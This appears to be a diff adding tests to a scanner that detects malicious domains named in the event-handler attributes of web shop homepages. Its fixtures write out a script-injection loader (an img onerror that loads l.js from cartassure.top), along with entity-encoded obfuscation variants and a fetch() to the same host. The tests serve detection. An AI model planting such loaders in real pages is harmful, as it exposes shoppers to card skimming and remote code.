@@ -32,6 +32,7 @@ import { findingLocation, toTopFindingViews } from "../../app/lib/top-findings";
 import { getTopFindingsOfTypes } from "../../app/models/finding.server";
 import { getFreePreviewFindings } from "../../app/services/free-preview.server";
 import {
+  decodeAttributeValue,
   findMaliciousInHomepage,
   HOMEPAGE_SOURCE_LABELS,
   homepageMaliciousFindings,
@@ -325,6 +326,165 @@ describe("findMaliciousInHomepage: hints, frames, forms, import maps (gc-3y89 #3
   });
 });
 
+// gc-7gjj.4: listed domains inside on*= event-handler attributes of any
+// element (the 17TRACK menu-label loader was an <img src=x onerror=...>).
+describe("findMaliciousInHomepage: on*= event handlers (gc-7gjj.4)", () => {
+  const loader = (host: string) =>
+    `s=document.createElement('script');s.src='https://${host}/l.js';document.head.appendChild(s)`;
+
+  it.each([
+    `<img src=x onerror="${loader("cartassure.top")}">`,
+    `<svg onload="${loader("cdn.cartassure.top")}"></svg>`,
+    `<a href="/x" onclick='${loader("cartassure.top").replace(/'/g, '"')}'>x</a>`,
+    `<body onpageshow="${loader("cartassure.top")}">`,
+    `<div ONMOUSEOVER="${loader("cartassure.top")}">x</div>`,
+    `<details open ontoggle=fetch('https://cartassure.top/c')>x</details>`,
+  ])("reads a listed host in a handler on any element: %s", (body) => {
+    const hits = findMaliciousInHomepage(page("", body), []);
+    expect(hits.map((h) => [h.domain, h.source])).toEqual([["cartassure.top", "event_handler"]]);
+  });
+
+  it("reads the handlers of loading and text-only elements too", () => {
+    for (const tag of [
+      `<script onload="${loader("cartassure.top")}">var a=1;</script>`,
+      `<link rel="stylesheet" href="/a.css" onload="${loader("cartassure.top")}">`,
+      `<iframe src="/x" onload="${loader("cartassure.top")}"></iframe>`,
+      `<form action="/cart" onsubmit="${loader("cartassure.top")}"></form>`,
+      `<style onload="${loader("cartassure.top")}">a{}</style>`,
+    ]) {
+      expect(
+        findMaliciousInHomepage(page(tag), []).map((h) => h.source),
+        tag,
+      ).toEqual(["event_handler"]);
+    }
+  });
+
+  it("decodes HTML character references in the handler before matching", () => {
+    for (const encoded of [
+      "https:&#47;&#47;cartassure.top/l.js",
+      "https:&#x2F;&#x2f;cartassure.top/l.js",
+      "https&colon;&sol;&sol;cartassure&period;top/l.js",
+      "&#104;&#116;&#116;&#112;&#115;://cartassure.top/l.js",
+      "&#x68;ttps://cartassure&#46top/l.js",
+    ]) {
+      const html = page("", `<img src=x onerror="s.src=&quot;${encoded}&quot;">`);
+      expect(
+        findMaliciousInHomepage(html, []).map((h) => h.domain),
+        encoded,
+      ).toEqual(["cartassure.top"]);
+    }
+  });
+
+  it("an event handler ranks after inline script and before a form", () => {
+    const both = page(
+      `<script>var u = "https://cartassure.top/x";</script>`,
+      `<img src=x onerror="${loader("cartassure.top")}">`,
+    );
+    expect(findMaliciousInHomepage(both, [])[0].source).toBe("inline_script");
+    const withForm = page(
+      "",
+      `<form action="https://cartassure.top/c"></form><img src=x onerror="${loader("cartassure.top")}">`,
+    );
+    expect(findMaliciousInHomepage(withForm, [])[0].source).toBe("event_handler");
+  });
+
+  it("labels the finding as JavaScript attached to an element", () => {
+    const hits = findMaliciousInHomepage(
+      page("", `<img src=x onerror="${loader("cartassure.top")}">`),
+      [],
+    );
+    expect(homepageMaliciousFindings(hits, new Set())[0].codeSnippet).toBe(
+      "cartassure.top\nNamed in JavaScript attached to an element in the page: cartassure.top",
+    );
+  });
+
+  describe("false positives: theme handlers with no listed host", () => {
+    it.each([
+      // Dawn: deferred stylesheet swap.
+      `<link rel="stylesheet" href="//shop.example/cdn/shop/t/1/assets/component-cart.css" media="print" onload="this.media='all'">`,
+      // Horizon: same pattern plus an image fade-in.
+      `<link rel="stylesheet" href="/cdn/shop/t/2/assets/overflow-list.css" media="print" onload="this.media='all'; this.onload = null">`,
+      `<img src="/cdn/shop/files/hero.jpg" onload="this.classList.add('loaded')" onerror="this.style.display='none'">`,
+      `<img src="/a.png" onerror="this.src='https://cdn.shopify.com/s/files/placeholder.png'">`,
+      `<button onclick="document.querySelector('cart-drawer').open()">Cart</button>`,
+      `<a href="https://cartassure.top/">named in an href, not a handler</a>`,
+      `<img src="https://cartassure.top/pixel.gif">`,
+      `<div data-onerror="${loader("cartassure.top")}" on="https://cartassure.top/x">x</div>`,
+      `<img src=x onerror="s.src='https://notcartassure.top/x.js'">`,
+    ])("reports nothing for %s", (body) => {
+      expect(findMaliciousInHomepage(page("", body), [])).toEqual([]);
+    });
+
+    it("skips handlers inside comments and inside inert element bodies", () => {
+      for (const body of [
+        `<!-- <img src=x onerror="${loader("cartassure.top")}"> -->`,
+        `<textarea><img src=x onerror="${loader("cartassure.top")}"></textarea>`,
+        `<template><img src=x onerror="${loader("cartassure.top")}"></template>`,
+        `<noscript><img src=x onerror="${loader("cartassure.top")}"></noscript>`,
+        `<script>var t = '<img src=x onerror="${loader("cartassure.top")}">';</script>`.replace(
+          "https://cartassure.top/l.js",
+          "/l.js",
+        ),
+      ]) {
+        expect(findMaliciousInHomepage(page("", body), []), body).toEqual([]);
+      }
+    });
+
+    it("any on<letters> attribute counts, known handler or not (doubt reports a listed domain)", () => {
+      const html = page("", `<div one="${loader("cartassure.top")}">x</div>`);
+      expect(findMaliciousInHomepage(html, []).map((h) => h.source)).toEqual(["event_handler"]);
+    });
+
+    it("an encoded reference that is not a URL stays harmless", () => {
+      const html = page("", `<img src=x onerror="alert('&lt;cartassure&gt;')">`);
+      expect(findMaliciousInHomepage(html, [])).toEqual([]);
+    });
+  });
+
+  it("a start tag that never closes stops handler reads but not script reads", () => {
+    const html = page(
+      "",
+      `<div title="never closed><img src=x onerror="${loader("cartassure.top")}"><script src="https://biliing.top/x.js"></script>`,
+    );
+    // The unclosed quote swallows the img for a browser too; the script after
+    // it is still read for what it loads (the read before gc-7gjj.4).
+    expect(findMaliciousInHomepage(html, []).map((h) => [h.domain, h.source])).toEqual([
+      ["biliing.top", "script"],
+    ]);
+  });
+
+  it("stays linear on 1 MB of handler-heavy or never-closed tags", () => {
+    const cases = [
+      page("", `<img src=x onload="this.media='all'" onerror="x()">`.repeat(20_000)),
+      page("", `<a title="${"<b x=".repeat(200_000)}">`),
+      page("", `<a x="`.repeat(170_000)),
+      page("", `<img onerror="${"&#47;".repeat(200_000)}">`),
+    ];
+    for (const html of cases) {
+      const started = Date.now();
+      expect(findMaliciousInHomepage(html, [])).toEqual([]);
+      expect(Date.now() - started).toBeLessThan(2_000);
+    }
+  });
+});
+
+describe("decodeAttributeValue", () => {
+  it("decodes numeric and common named references", () => {
+    expect(decodeAttributeValue("a&#47;b&#x2F;c&quot;d&amp;e&#58f&colon;")).toBe('a/b/c"d&e:f:');
+  });
+
+  it("leaves unknown, unterminated named, and out-of-range references as written", () => {
+    expect(decodeAttributeValue("&bogus; &amp &#0; &#xD800; &#99999999;")).toBe(
+      "&bogus; &amp &#0; &#xD800; &#99999999;",
+    );
+  });
+
+  it("returns the value unchanged when there is nothing to decode", () => {
+    expect(decodeAttributeValue("")).toBe("");
+    expect(decodeAttributeValue("this.media='all'")).toBe("this.media='all'");
+  });
+});
+
 describe("maliciousDomainsInUrls (speed test requests)", () => {
   it("returns the listed domains, de-duplicated and sorted, subdomains included", () => {
     expect(
@@ -347,13 +507,15 @@ describe("maliciousDomainsInUrls (speed test requests)", () => {
         "https://cartassure.top/check-out/assets/l3.js",
       ]),
     ).toEqual(["cartassure.top"]);
-    // Known gap, closed by gc-7gjj sub-bead D: the same loader in the static
-    // homepage HTML is not read. Flip this when on*= attributes are scanned.
+    // Gap closed by gc-7gjj.4: the same loader in the static homepage HTML
+    // is read from the img's onerror handler.
     const menuLabel = page(
       "",
       "<a href=\"/collections/all\">Shop<img src=x onerror=\"s=document.createElement('script');s.src='https://cartassure.top/check-out/assets/l2.js';document.head.appendChild(s)\"></a>",
     );
-    expect(findMaliciousInHomepage(menuLabel, [])).toEqual([]);
+    expect(findMaliciousInHomepage(menuLabel, [])).toEqual([
+      { domain: "cartassure.top", host: "cartassure.top", source: "event_handler" },
+    ]);
   });
 
   it("skips lookalikes, non-http URLs, non-strings and garbage", () => {
